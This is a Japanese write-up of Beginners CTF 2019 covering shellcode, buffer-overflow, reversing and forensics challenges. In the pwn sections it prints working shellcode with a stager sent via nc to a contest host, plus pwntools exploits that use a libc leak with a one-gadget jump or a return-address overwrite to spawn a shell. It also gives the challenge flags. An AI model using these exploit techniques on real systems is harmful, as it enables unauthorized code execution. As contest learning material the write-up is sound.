# Begginers CTF 2019 write up

今年は会社の同期と組んでチーム[R19](<https://ctftime.org/team/81545>)として Begginers CTFに参加した。
結果は2939ptで22位。
チームメイト二人が自分の苦手なwebとcryptoを解きまくってくれた。

自分の担当は pwn & revで、pwn 1問 + rev 3問 + misc 1問 を解いたので、終了後に解いたpwn2問とともに write up を残す。



# Pwnable

## shellcoder

shellcodeを書く問題。shellcodeの書き方は[別記事](<https://qiita.com/yacropolisy/items/97ea176484f5b05c195d>)にまとめた。

shellcodeを送ったらそのまま実行してくれるが、shellcodeに "b", "i", "n", "s", "h" が含まれる場合は弾かれてしまう。

さらに、送信可能な文字列長も40バイトに限られている。

始めは、以下のように "/bin/sh" である 0x68732f6e69622f2f を 0x67727e6d67612e2e + 0x0101010102010101と表すことで文字制限を回避しようとしたが、shellcodeが長くなりすぎて(49バイト) 失敗した。

```
BITS 64
global _start

 _start:
 xor rdx, rdx
 mov ebx, 0x67722e6d
 add ebx, 0x01010101
 shl rbx, 0x20
 add rbx, 0x67612e2e
 add rbx, 0x02010101
 shr rbx, 0x8
 push rbx
 mov rdi, rsp
 push rax
 push rdi
 mov rsi, rsp
 mov al, 0x3b
 syscall
```

そこで、入力文字数制限と聞いてstagerのことを思い出し、stager + shellcodeで突破した。

stagerというのは追加でshellcodeを読み込むためのshellcode。
stagerは短く書けるので、入力可能な文字の長さに制限がある場合などにとりあえずstagerを流し込んで、そのあとに本命のシェルコードを流し込んだりできる。



### 解法

stagerは書いたことが無かったので、ネットで適当に拾ってきた以下のコードを用いた。

```
; stager.s
BITS 64
global _start

_start:
  jmp stager1
pc:
  pop rsi
  jmp stager2
stager1:
  xor rax,rax
  push rax
  pop rdi
  push rax
  pop rdx
  inc rdx
  shl rdx,10
  call pc
stager2:
  add rsi,6
  syscall
```

これをアセンブルして文字列として取り出し、[shell-storm](<http://shell-storm.org/shellcode/files/shellcode-905.php>)から取ってきた シェルコードにNOPスレッドを挟んでつなげて投げた。

```
nasm -f elf64 stager.s
ld -s -o a.out stager.s
objdump -M intel -d a.out | grep '^ ' | cut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g'
```

```
(echo -e '\xeb\x03\x5e\xeb\x13\x48\x31\xc0\x50\x5f\x50\x5a\x48\xff\xc2\x48\xc1\xe2\x0a\xe8\xea\xff\xff\xff\x48\x83\xc6\x06\x0f\x05\n\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05' ; cat - ) | nc 153.120.129.186 20000
```



flagは `ctf4b{Byp4ss_us!ng6_X0R_3nc0de}`

どうやら想定解はxor encodeというものらしい。



他の人のwriteup見てると、"binsh"が含まれないシェルコードはネット上に普通に転がっているらしい、、、。

まあ、色々と勉強になったのでよし。



## OneLine

時間内に解けなかった。あと1時間くらいあれば、、。

2回入力ができるプログラムとlibcのファイルが渡される。

入力のバッファは32バイトでreadで40バイト読み込んでいるため、バッファオーバーフローが起こせる。

libcが提供されているので、1度目 => libcのアドレスの出力、2度目 =>  libcのsystem実行という流れは見えたが、まずlibcのアドレスの出力でハマった。

バッファオーバーフローでpintfのpltに飛ばして、、といったことを色々試したが、引数をこちらから指定できないため成功せず。

その後、始めから最後の8バイトに入っているアドレスがlibcのwriteのアドレスということに気づき、最初からわかってたんやーん状態に。

また、libcのsystem実行においても引数が指定できないため、"/bin/sh"を渡すことができない。

これに対しては、system関数に飛ばすのではなく、[one gadget RCE](<http://katc.hateblo.jp/entry/2016/10/28/124025#%E8%A7%A3%E6%B3%952One-gadget-RCE%E3%81%A7instant-win%E4%BD%9C%E6%88%A6>) を用いることで引数を指定しなくてもshellを起動できる。

one gadget RCEは存在だけ知っていて実際に使ったことが無かったので探しているうちにタイムアップになってしまった、、。



### 解法

1. 1回目の入力 => 何も入力せず、出力される文字列から最後の8バイトを抜き出して**プログラム実行時の**libcのwriteのアドレスを得る。

2. **libcのファイル内の**one gadget RCEのアドレスと writeのアドレスの差から**プログラム実行時の**one gadget RCE のアドレスを計算する。

3. 2回目 => 32文字適当に入力し、その次に**プログラム実行時の**one gadget RCE のアドレスを入力する



one gadget RCEは、[one_gadget](<https://github.com/david942j/one_gadget>) を使えば候補を出してくれる。

```bash
% one_gadget libc-2.27.so                                                     
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

今回は一番下の `0x10a38c` を用いた。



exploitコード

```python
from pwn import *
rhp = {'host': '153.120.129.186', 'port':10000}

libc = ELF('./libc-2.27.so')
offset_libc_rce = 0x10a38c
offset_libc_write = libc.symbols[b'write']

conn = remote(rhp['host'], rhp['port'])

log.info(conn.recv()) 
conn.sendline('')
res = conn.recv(40)
log.info(res)
write_addr = res[-8:]
print(write_addr)
rce_addr = u64(write_addr) - offset_libc_write + offset_libc_rce
log.info(rce_addr)

payload = b"a" * 32 + p64(rce_addr)
print(payload)
conn.sendline(payload)
log.info(conn.recvrepeat(1))

conn.interactive()
```



flagは `ctf4b{0v3rwr!t3_Func7!on_p0int3r}` 



## memo

これも解けなかった。普通に分からんかった。

最初[warm up]になっていたし、普通に簡単そうなのに全然解けなかった。

input サイズを聞かれ、数値を入力し、その後contentを入力するとそれを出力してくれる。

ただ、数値は負数でも通ってしまうので、負の値を入れることでリターンアドレスを書き換えることができる。

そして、シェルを起動するhidden関数がご丁寧に用意されているので、そこに飛ばせば良いと思いきや、、。

普通に飛ばしても全然うまくいかない。

これはどうやらrbpを上書きしてしまったせいで変な値になっており、system関数の中でエラーが発生してしまうためらしい。

そのため、hidden関数の最初の `push rbp; mov rbp, rsp; ` を飛ばしてあげれば良い。



### 解法

1. 最初の入力で -96 以下の値を入力する。-96以下の値は何を入力しても書き込まれる場所は変わらない（多分）
2. 適当に8文字 + hidden関数の3命令目のアドレスを入力する。



```python
from pwn import *
rhp = {'host': '133.242.68.223', 'port':35285}
hidden = 0x4007bd
hidden_skip_prologue = 0x4007c1

conn = remote(rhp['host'], rhp['port'])

log.info(conn.recv()) 
payload = "-96"
print(payload)
conn.sendline(payload)
log.info(conn.recv()) 
payload = b"A" * 8 + p64(hidden_skip_prologue)
print(payload)
conn.sendline(payload)

conn.interactive()
```



flagは `ctf4b{h4ckn3y3d_574ck_b0f}`



# Reversing

## Seccompare

./seccompare flag の形式で実行すればflagの文字列が正しいか判定してくれる。

文字列まんま比較してるのでgdbで見てあげれば一発。

gdbで `disas main` で見てみると <+73> ~ <+185> くらいでスタックに文字列突っ込んで <+210> で比較しているのが分かる。

```assembly
   0x00000000004005e7 <+0>:     push   rbp                                                  
   0x00000000004005e8 <+1>:     mov    rbp,rsp
   0x00000000004005eb <+4>:     sub    rsp,0x40
   0x00000000004005ef <+8>:     mov    DWORD PTR [rbp-0x34],edi
   0x00000000004005f2 <+11>:    mov    QWORD PTR [rbp-0x40],rsi
   0x00000000004005f6 <+15>:    mov    rax,QWORD PTR fs:0x28
   0x00000000004005ff <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400603 <+28>:    xor    eax,eax
   0x0000000000400605 <+30>:    cmp    DWORD PTR [rbp-0x34],0x1
   0x0000000000400609 <+34>:    jg     0x400630 <main+73>
   0x000000000040060b <+36>:    mov    rax,QWORD PTR [rbp-0x40]
   0x000000000040060f <+40>:    mov    rax,QWORD PTR [rax]
   0x0000000000400612 <+43>:    mov    rsi,rax
   0x0000000000400615 <+46>:    lea    rdi,[rip+0x168]        # 0x400784
   0x000000000040061c <+53>:    mov    eax,0x0
   0x0000000000400621 <+58>:    call   0x4004e0 <printf@plt>
   0x0000000000400626 <+63>:    mov    eax,0x1
   0x000000000040062b <+68>:    jmp    0x4006e1 <main+250>
   0x0000000000400630 <+73>:    mov    BYTE PTR [rbp-0x30],0x63
   0x0000000000400634 <+77>:    mov    BYTE PTR [rbp-0x2f],0x74
   0x0000000000400638 <+81>:    mov    BYTE PTR [rbp-0x2e],0x66
   0x000000000040063c <+85>:    mov    BYTE PTR [rbp-0x2d],0x34
   0x0000000000400640 <+89>:    mov    BYTE PTR [rbp-0x2c],0x62
   0x0000000000400644 <+93>:    mov    BYTE PTR [rbp-0x2b],0x7b
   0x0000000000400648 <+97>:    mov    BYTE PTR [rbp-0x2a],0x35
   0x000000000040064c <+101>:   mov    BYTE PTR [rbp-0x29],0x74
   0x0000000000400650 <+105>:   mov    BYTE PTR [rbp-0x28],0x72
   0x0000000000400654 <+109>:   mov    BYTE PTR [rbp-0x27],0x31
   0x0000000000400658 <+113>:   mov    BYTE PTR [rbp-0x26],0x6e
   0x000000000040065c <+117>:   mov    BYTE PTR [rbp-0x25],0x67
   0x0000000000400660 <+121>:   mov    BYTE PTR [rbp-0x24],0x73
   0x0000000000400664 <+125>:   mov    BYTE PTR [rbp-0x23],0x5f
   0x0000000000400668 <+129>:   mov    BYTE PTR [rbp-0x22],0x31
   0x000000000040066c <+133>:   mov    BYTE PTR [rbp-0x21],0x73
   0x0000000000400670 <+137>:   mov    BYTE PTR [rbp-0x20],0x5f
   0x0000000000400674 <+141>:   mov    BYTE PTR [rbp-0x1f],0x6e
   0x0000000000400678 <+145>:   mov    BYTE PTR [rbp-0x1e],0x30
   0x000000000040067c <+149>:   mov    BYTE PTR [rbp-0x1d],0x74
   0x0000000000400680 <+153>:   mov    BYTE PTR [rbp-0x1c],0x5f
   0x0000000000400684 <+157>:   mov    BYTE PTR [rbp-0x1b],0x65
   0x0000000000400688 <+161>:   mov    BYTE PTR [rbp-0x1a],0x6e
   0x000000000040068c <+165>:   mov    BYTE PTR [rbp-0x19],0x30
   0x0000000000400690 <+169>:   mov    BYTE PTR [rbp-0x18],0x75
   0x0000000000400694 <+173>:   mov    BYTE PTR [rbp-0x17],0x67
   0x0000000000400698 <+177>:   mov    BYTE PTR [rbp-0x16],0x68
   0x000000000040069c <+181>:   mov    BYTE PTR [rbp-0x15],0x7d
   0x00000000004006a0 <+185>:   mov    BYTE PTR [rbp-0x14],0x0
=> 0x00000000004006a4 <+189>:   mov    rax,QWORD PTR [rbp-0x40]
   0x00000000004006a8 <+193>:   add    rax,0x8
   0x00000000004006ac <+197>:   mov    rdx,QWORD PTR [rax]
   0x00000000004006af <+200>:   lea    rax,[rbp-0x30]
   0x00000000004006b3 <+204>:   mov    rsi,rdx
   0x00000000004006b6 <+207>:   mov    rdi,rax
   0x00000000004006b9 <+210>:   call   0x4004f0 <strcmp@plt>
   0x00000000004006be <+215>:   test   eax,eax
   0x00000000004006c0 <+217>:   jne    0x4006d0 <main+233>
   0x00000000004006c2 <+219>:   lea    rdi,[rip+0xcb]        # 0x400794
   0x00000000004006c9 <+226>:   call   0x4004c0 <puts@plt>
   0x00000000004006ce <+231>:   jmp    0x4006dc <main+245>
   0x00000000004006d0 <+233>:   lea    rdi,[rip+0xc5]        # 0x40079c
   0x00000000004006d7 <+240>:   call   0x4004c0 <puts@plt>
   0x00000000004006dc <+245>:   mov    eax,0x0
   0x00000000004006e1 <+250>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004006e5 <+254>:   xor    rcx,QWORD PTR fs:0x28
   0x00000000004006ee <+263>:   je     0x4006f5 <main+270>
   0x00000000004006f0 <+265>:   call   0x4004d0 <__stack_chk_fail@plt>
   0x00000000004006f5 <+270>:   leave
   0x00000000004006f6 <+271>:   ret
```



### 解法

gdbで実行して、スタックに文字列突っ込んでるとこまで適当に進んであげる。

コマンドライン引数を指定してあげないと文字列比較の命令に進まないので、 `start hoge`  として適当に引数を与えてあげている。

```
gdb seccompare
start hoge
b *0x00000000004006a4
c
```

あとは文字列の先頭アドレスが `rbp-0x30` なのでそこを見てあげるだけ。

アドレスの内部を覗く`x/` コマンドに 文字列で表示する `s` オプションをつけてあげる。

```
x/s $rbp-0x30
```



flagは `ctf4b{5tr1ngs_1s_n0t_en0ugh}` 

流石にstringsコマンドだけで解かせてはくれないよってことね。



## Leakage

1問目同様、 ./leakage flag の形式。

今度は is_correct関数内でチェックをしている。



gdbで `disas is_correct` してあげると初めに<+19>, <+24> でstrlenをcmpしてるのでflag長は `0x22` だと分かる。

続く <+37> ~ <+117> の部分はfor loop になっていて、一文字ずつ処理をしている。

毎回のループでは、 `0x400c60` に入っている enc_flagの文字列(<+52>) のi文字目をconvert(<+68>)して、コマンドライン引数で渡した文字列のi文字目と比較(<+92>)している。

```assembly
   0x00000000004005e8 <+1>:     mov    rbp,rsp
   0x00000000004005eb <+4>:     sub    rsp,0x20
   0x00000000004005ef <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x00000000004005f3 <+12>:    mov    rax,QWORD PTR [rbp-0x18]
   0x00000000004005f7 <+16>:    mov    rdi,rax
   0x00000000004005fa <+19>:    call   0x4004d0 <strlen@plt>
   0x00000000004005ff <+24>:    cmp    rax,0x22
   0x0000000000400603 <+28>:    je     0x40060c <is_correct+37>
   0x0000000000400605 <+30>:    mov    eax,0x0
   0x000000000040060a <+35>:    jmp    0x40065e <is_correct+119>
   0x000000000040060c <+37>:    mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000400613 <+44>:    jmp    0x400653 <is_correct+108>
   0x0000000000400615 <+46>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400618 <+49>:    movsxd rdx,eax
   0x000000000040061b <+52>:    lea    rax,[rip+0x63e]        # 0x400c60 <enc_flag>
   0x0000000000400622 <+59>:    movzx  eax,BYTE PTR [rdx+rax*1]
   0x0000000000400626 <+63>:    movzx  eax,al
   0x0000000000400629 <+66>:    mov    edi,eax
   0x000000000040062b <+68>:    call   0x4006d0 <convert>
   0x0000000000400630 <+73>:    mov    BYTE PTR [rbp-0x5],al
   0x0000000000400633 <+76>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000400636 <+79>:    movsxd rdx,eax
   0x0000000000400639 <+82>:    mov    rax,QWORD PTR [rbp-0x18]
   0x000000000040063d <+86>:    add    rax,rdx
   0x0000000000400640 <+89>:    movzx  eax,BYTE PTR [rax]
   0x0000000000400643 <+92>:    cmp    BYTE PTR [rbp-0x5],al
   0x0000000000400646 <+95>:    je     0x40064f <is_correct+104>
   0x0000000000400648 <+97>:    mov    eax,0x0
   0x000000000040064d <+102>:   jmp    0x40065e <is_correct+119>
   0x000000000040064f <+104>:   add    DWORD PTR [rbp-0x4],0x1
   0x0000000000400653 <+108>:   cmp    DWORD PTR [rbp-0x4],0x21
   0x0000000000400657 <+112>:   jle    0x400615 <is_correct+46>
   0x0000000000400659 <+114>:   mov    eax,0x1
   0x000000000040065e <+119>:   leave
   0x000000000040065f <+120>:   ret
```



### 解法

関数の返り値はraxに格納されるので、<+68> のconvert関数の返り値をチェックするため<+73>にブレークポイントを仕掛ければ良い。

<+92>での比較は間違えた瞬間ループを抜けるので、一文字ずつflagを調べていく。

```
b *0x0000000000400630
start ctf4b{aaaaaaaaaaaaaaaaaaaaaaaaaaa}
c
printf "%c\n", $al 
# => c
c
printf "%c\n", $al 
# => t
c
printf "%c\n", $al 
# => f
c
printf "%c\n", $al 
# => 4
c
printf "%c\n", $al 
# => b
c
printf "%c\n", $al 
# => {
c
printf "%c\n", $al 
# => l

start ctf4b{laaaaaaaaaaaaaaaaaaaaaaaaaa}
c
printf "%c\n", $al 
# => c
.
.
.

```

gdb-peda を使えばわざわざpritnfしなくても常にレジスタの中身を表示してくれるので便利。





flagは `ctf4b{le4k1ng_th3_f1ag_0ne_by_0ne}`



## linear_operation

これはコマンドライン引数ではなく実行してflagを入力する形式。

今回もis_correct関数でflagが正しいかチェックしているが、複雑さがこれまでの比ではない。

毎回flagから適当に2文字f1, f2を取ってきて、f2のバイト列を逆順にしたf2'を用いてf1^f2'+e1^e2*e3+e4 = e5 ? みたいな処理をしている。(e1, e2, e3, e4, e5は毎回変わる。 ^, *, + の演算子も毎回変わる)

しかもflagは63文字。死ぬ。



### 解法

死にました。心が。

楽な方法があるんだろうなと確信しながら、分からないのでその時できることをやりました。

63文字分条件書き出し。人間のすることじゃなかった。

```python
f =  list("ctf4b{12345678901234567890123456789012345678901234567890123456}")

def rev(x):
    return chr(int(format(x, '08b')[::-1], 2))

def rev2(c):
    return int(format(ord(c), '08b')[::-1], 2)

f[0x13] = rev((0x1288^0x9b^0x65)//0x22^0x11^ord(f[3]))
f[0xb] = rev((0x8990af // 0xcf ^ 0x73) // 0xa9 - 0x51 - ord(f[5]))
f[0xc] = rev((0x4475 - 0x39 - 0x15 ^ 0xdc ^ 0xa7) // ord(f[0x3e]))
f[0x15] = rev(((0x1531aa // 0x5a) - 0xcf - 0x70 ^ 0xce) // ord(f[2]))
f[0x32] = rev(0xaa7b7f5a0 // 0xac // 0xe1 // 0xaa // 0x5e ^ ord(f[2]))
f[0x6] = rev((0x7d5f - 0x79 - 0xff) // 0x6d - 0x63 ^ ord(f[0x0b]))
f[0x1b] = rev((0x1e6c // 0x2c - 0xb1) // 0xd6 ^ 0x9c^ord(f[2]))
f[0x2a] = rev(((0xe65a - 0xfe) // 0xe9 ^ 0xe9 ^ 0xbf) - ord(f[0x32]))
f[0x24] = rev(((0x107df8178 // 0xb7 // 0xe5 - 0x40) // 0xc // ord(f[6])))
f[0x39] = rev((0x1750 - 0x0da - 0x54 ^ 0xc5 ) // 0x29 - ord(f[0]))
f[0x16] = rev(((0x1f9 ^ 0xfd) - 0xd ^ 0xf0 ^ 0x7f) - ord(f[0xb]))
f[0x11] = rev((0x70355a0f0 // 0x50 - 0xb5) // 0xbf // 0x7d // ord(f[0x1b]))
f[0x3c] = rev(((0x265c4c ^ 0xfc) // 0xdd // 0x9e ^ 0x31 ^ ord(f[0x13])))
f[0x14] = rev(0x2aafd // 0x55 // 0x79 ^ 0xbf ^ 0xb1 ^ ord(f[0xc]))
f[0xa] = rev(((0x54f448 // 0xb5 ^ 0x76 ) // 0x3e ^ 0xae) - ord(f[0x15]))
f[0x10] = rev((0x140ee - 0xae) // 0xb7 - 0x66 - 0xc7 - ord(f[0x13]))
f[0x3a] = rev((0x14bfdd - 0xed) // 0xa // 0x16 // 0xce ^ ord(f[0x16]))
f[0x35] = rev((0x1d888dc0 // 0x27 // 0x7e // 0x5c ^ 0xf4) // ord(f[0x11]))
f[0x1e] = rev((0x636 ^ 0xde) // 0x8 - 0x12 ^ 0xcf ^ ord(f[0x4]))
f[0x2f] = rev((0x25920 // 0xe0 - 0x1 - 0xe4 ^ 0xcb) - ord(f[0x13]))
f[0xf] = rev((0x15ffa // 0x8f - 0xf6 - 0x3 ^ 0x34 )- ord(f[0x3e]))
f[0x1a] = rev((0x9b21 ^ 0x2) // 0xeb ^ 0x34 ^ 0x27 ^ ord(f[0x14]))
f[0x37] = rev((0x3a71 ^ 0xc0 ^ 0xe6 ) // 0x67 ^ 0x3b ^ ord(f[0x1e]))
f[0x3b] = rev(((0x248 ^ 0xd1 ^ 0xd8) - 0xbc - 0xbf - ord(f[0x16])))
f[0x17] = rev((0x1edc - 0x4f ^ 0x7f ^ 0x76) // 0xfc ^ ord(f[0x3b]))
f[0xd] = rev((((0x6f63 - 0xf0) // 0x91 - 0xac ^ 0xec) - ord(f[0x6])))
f[0x12] = rev(((0x5062 - 0x5b ^ 0xc0) - 0xb3) // 0x52 - ord(f[0x39]))
f[0x30] = rev(((0x200 - 0xb9 ^ 0x5d) - 0xfe ^ 0xf7) - ord(f[0x13]))
f[0x27] = rev((0x322 - 0xf1 - 0x99 - 0x97 ^ 0x5b) - ord(f[0x1]))
f[0x29] = rev((0xc6d4 - 0x61 ^ 0xdf ^ 0x0f) // 0xd3 - ord(f[0x24]))
f[0x2b] = rev((0x4c2cf // 0x3d - 0xcb ^ 0xae) // 0x1b ^ ord(f[0x1]))
f[0x18] = rev(0x22ea6a // 0xa7 // 0x22 - 0xa6 ^ 0x70 ^ ord(f[0x27]))
f[0x2e] = rev((((0x30e ^ 0x62) - 0xac) // 0xb ^ 0xd9) - ord(f[0]))
f[0x36] = rev(((0x4f000 - 0x8c ^ 0x72) - 0x9e ) // 0xc7 // ord(f[0x14]))
f[0x21] = rev((0x2913 ^ 0xd8 ^ 0x17) // 0x5e - 0x54 ^ ord(f[0x3c]))
f[0x38] = rev(((0x13836524 // 0x9e ^ 0x71) - 0x7 ) // 0xe5 //ord(f[0x3a])) 
f[0x1c] = rev((0x1fb ^0x22 ^ 0x3) - 0xac - 0x6f ^ ord(f[0x1a]))
f[0x2d] = rev((0x233 ^ 0x4a ) - 0xe0 - 0x36 - 0x36 - ord(f[0x0f]))
f[0x8] = rev((((0x24fa1a ^ 0x3) - 0xec) // 0x8d ^ 0xab) // ord(f[0x1b]))
f[0x2c] = rev((0x336 - 0x5a - 0xfa - 0xc2) // 0x4 ^ ord(f[2]))
f[0x3d] = rev((0x8340963 // 0x5d ^ 0xa1 ^ 0x36) // 0x84 // ord(f[0x2d]))
f[0x1f] = rev((0xdc9a - 0x37 ^ 0x7d) // 0x73 - 0xf1 ^ ord(f[0x1b]))
f[0xe] = rev((0x3d1c2e // 0x7e - 0xa2 ^ 0x9f) // 0x9c ^ ord(f[0x35]))
f[0x7] = rev(((0x647d ^ 0x8e ^0xe8 ) - 0x4a) //0x65 ^ ord(f[0xd]))

f[0x23] = rev(((0xce867 ^ 0xbf) // 0x41 - 0xb8 ^ 0x66) // ord(f[0x13]))
f[0x9] = rev((0x389afc // 0x6c - 0xec) // 0x53 - 0xe7 - ord(f[0x30]))

f[0x31] = chr((0x1aa40 - 0x27 - 0x5b) //0xad //0x6 - rev2(f[0x2e]))
f[0x34] = chr(((0x2d0c // 0x3e ^ 0xf4 ^0x19 ^ 0x9a) - rev2(f[0x23])))

f[0x28] = rev((0x7edb7 - 0x35 - 0xe5 ^ 0x45) //0x4c // ord(f[0x31]))

f[0x33] = chr((0x17a00 ^ 0x60 ^ 0x99)// 0xdb - 0xfd ^ rev2(f[0x31]))
f[0x19] = chr((0x1fe - 0xb5 - 0x84 ^ 0x7c ^0xe6) - rev2(f[0x2c]))
f[0x25] = chr(0x133660 // 0x49 // 0x62 ^ 0x2a ^0xf3 ^ rev2(f[0xb]))
f[0x22] = chr(0xe7 ^ 0xae ^0x6f ^0x43 ^ 0xc2 ^ rev2(f[0x15]))
f[0x26] = chr(((0x137119 ^ 0xb3) - 0x9a - 0x80 ) // 0xaf // rev2(f[0x2f]))
print(f[0x26])


f[0x1d] = "f"
f[0x20] = "c"

print(''.join(f))
```



flagは `ctf4b{5ymbol1c_3xecuti0n_1s_3ffect1ve_4ga1nst_l1n34r_0p3r4ti0n}`

どうやら `symbolic execution` という便利な技術があるらしい。

 `angr` という便利なpythonのライブラリがあるらしい。



## container

foremostしたらpngイメージが大量に出てくるので画像中の文字列をつないで終了。

forensicの問題はとりあえず [この記事](<https://qiita.com/knqyf263/items/6ebf06e27be7c48aab2e>) にあるツールを試してる。

### 解法

```
foremost e35860e49ca3fa367e456207ebc9ff2f_containers
```



flag は `ctf4b{e52df60c058746a66e4ac4f34db6fc81}` 